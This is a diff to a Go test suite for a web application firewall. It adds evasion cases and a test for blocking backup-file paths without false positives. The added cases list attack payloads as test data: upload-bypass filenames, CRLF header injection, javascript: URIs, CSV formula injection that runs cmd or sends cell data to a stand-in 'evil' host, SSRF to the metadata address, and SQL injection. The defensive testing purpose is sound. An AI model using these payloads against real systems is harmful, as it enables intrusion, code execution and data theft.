@@ -487,6 +487,50 @@ var evasions = []evasion{
 	{name: "artifact/pprof heap", technique: "none", target: "/debug/pprof/heap"},
 	{name: "artifact/sql dump", technique: "none", target: "/backup/db-dump.sql"},
 	{name: "artifact/editor backup", technique: "none", target: "/wp-config.php.bak"},
+
+	// Upload filter bypass: the check reads the last extension, the server
+	// resolves an earlier one. Four parsers, four disagreements about where the
+	// name ends -- the same shape as the canonicalization bug class.
+	{name: "dblext/apache mod_mime", technique: "double-extension", target: "/uploads/shell.php.jpg"},
+	{name: "dblext/trailing dot", technique: "double-extension", target: "/uploads/shell.php."},
+	{name: "dblext/iis semicolon", technique: "semicolon-truncate", target: "/uploads/shell.asp;.jpg"},
+	{name: "dblext/null truncate", technique: "null-byte", target: "/uploads/shell.php%00.png"},
+	{name: "dblext/nginx path-info", technique: "path-info", target: "/uploads/img.jpg/x.php/foo"},
+	{name: "dblext/phar behind gif", technique: "double-extension", target: "/uploads/payload.phar.gif"},
+	{name: "dblext/jsp behind png", technique: "double-extension", target: "/files/cmd.jsp.png"},
+	{name: "dblext/filename argument", technique: "double-extension", arg: "avatar.php.jpg"},
+
+	// Header injection. A bare CR or LF in a header value cannot occur in a
+	// well-formed request, so there is nothing to weigh against it.
+	{name: "hdrinj/host crlf", technique: "crlf", header: [2]string{"Host", "evil.com\r\nX-Injected: 1"}},
+	{name: "hdrinj/referer split", technique: "crlf", header: [2]string{"Referer", "http://a/\r\nSet-Cookie: admin=1"}},
+	{name: "hdrinj/bare lf", technique: "crlf", header: [2]string{"X-Request-Id", "abc\nLocation: http://evil"}},
+
+	// Script URIs reflected into an href. The scheme alone is prose; the scheme
+	// with a call is code.
+	{name: "scripturi/bare call", technique: "none", arg: "javascript:alert(1)"},
+	{name: "scripturi/backtick call", technique: "backtick", arg: "javascript:alert`1`"},
+	{name: "scripturi/tab in scheme", technique: "control-char", arg: "java\tscript:alert(1)"},
+	{name: "scripturi/comment skip", technique: "comment", arg: "javascript://%0aalert(1)"},
+	{name: "scripturi/vbscript", technique: "none", arg: "vbscript:msgbox(1)"},
+	{name: "scripturi/data html", technique: "data-uri", arg: "data:text/html,<script>alert(1)</script>"},
+
+	// Formula injection: stored here, executed on a colleague's laptop when the
+	// CSV export is opened.
+	{name: "formula/dde cmd", technique: "none", arg: "=cmd|'/c calc'!A1"},
+	{name: "formula/plus dde", technique: "none", arg: "+cmd|'/c powershell'!A1"},
+	{name: "formula/webservice exfil", technique: "none", arg: "=WEBSERVICE(\"http://evil/?d=\"&A1)"},
+	{name: "formula/hyperlink exfil", technique: "none", arg: "=HYPERLINK(\"http://evil/?d=\"&A1,\"click\")"},
+	{name: "formula/importxml", technique: "none", arg: "=IMPORTXML(\"http://evil/x\",\"//a\")"},
+
+	// The metadata address written the four other ways inet_aton accepts.
+	{name: "ssrf/metadata decimal", technique: "numeric-ip", arg: "http://2852039166/latest/meta-data/"},
+	{name: "ssrf/metadata hex", technique: "numeric-ip", arg: "http://0xa9fea9fe/latest/meta-data/"},
+	{name: "ssrf/metadata v6-mapped", technique: "numeric-ip", arg: "http://[::ffff:169.254.169.254]/"},
+
+	// Error-based exfiltration through a type error in the message.
+	{name: "sqli/gtid_subset", technique: "error-based", arg: "1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT user())),1)"},
+	{name: "sqli/name_const", technique: "error-based", arg: "1 UNION SELECT NAME_CONST(version(),1)"},
 	{name: "artifact/config traversal", technique: "none", target: "/x?img=../wp-config.php"},
 	{name: "artifact/env traversal", technique: "none", target: "/x?f=../../.env"},
 
@@ -951,6 +995,13 @@ var declaredClasses = map[string]int{
 	"crlf":      3,
 	"upload":    9,
 	"htaccess":  5,
+
+	// The upload-filter bypass that put a web shell in an adopter's WordPress,
+	// and the three classes added alongside it.
+	"dblext":    7,
+	"hdrinj":    3,
+	"scripturi": 5,
+	"formula":   5,
 }
 
 // classOf returns the attack class a case belongs to, taken from its name.
@@ -2509,5 +2560,58 @@ func TestProtocolVersionsAllPass(t *testing.T) {
 				t.Errorf("%s blocked: rule=%d", proto, d.RuleID())
 			}
 		})
+	}
+}
+
+// TestBackupArtifactRequiresDoubledExtension pins the discriminator that took
+// rule 1008 from six false positives to none.
+//
+// The rule used to match any backup extension anywhere, which meant a
+// file-storage product serving a user's "quarterly-notes.bak" tripped it — those
+// six requests in 10,433 were gwaf's entire remaining false-positive rate. The
+// fix is not a threshold or an exception list: an actual leftover artifact still
+// carries the source extension it was copied from, because that is what appending
+// ".bak" to a real filename produces. A bare user filename never does.
+//
+// Both halves are asserted here, because narrowing a rule until it stops firing
+// is not a fix and only the attack half proves it wasn't.
+func TestBackupArtifactRequiresDoubledExtension(t *testing.T) {
+	w := newWAF(t)
+
+	attacks := []string{
+		"/wp-config.php.bak",   // the canonical WordPress disclosure
+		"/index.php~",          // editor tilde
+		"/settings.py.orig",    // merge leftover
+		"/app/config.yml.save", // editor crash file
+		"/.env.backup",         // credentials
+		"/db/main.conf.old",    // deploy leftover
+		"/web.config.bak",      // IIS
+		"/backup/db-dump.sql",  // dump, matched by directory
+		"/dumps/prod.sql.gz",   // compressed dump
+		"/api/v1/x.php.swp",    // vim swap under an API path
+	}
+	for _, p := range attacks {
+		d := runEvasion(t, w, evasion{target: p})
+		if !d.Blocked() {
+			t.Errorf("backup artifact %q not blocked", p)
+		}
+	}
+
+	// The six that used to be false positives, plus the shapes around them.
+	benign := []string{
+		"/api/v1/files/quarterly-notes.bak",
+		"/api/v1/files/schema-2026.sql",
+		"/api/v1/files/draft.old",
+		"/api/v1/files/budget.orig",
+		"/api/v1/files/session.save",
+		"/api/v1/files/export.dump",
+		"/files/photo.jpg.bak", // a backup of an image discloses nothing
+		"/~alice/profile",      // tilde that is not an editor suffix
+	}
+	for _, p := range benign {
+		d := runEvasion(t, w, evasion{target: p})
+		if d.Blocked() {
+			t.Errorf("benign path %q blocked by rule %d", p, d.RuleID())
+		}
 	}
 }
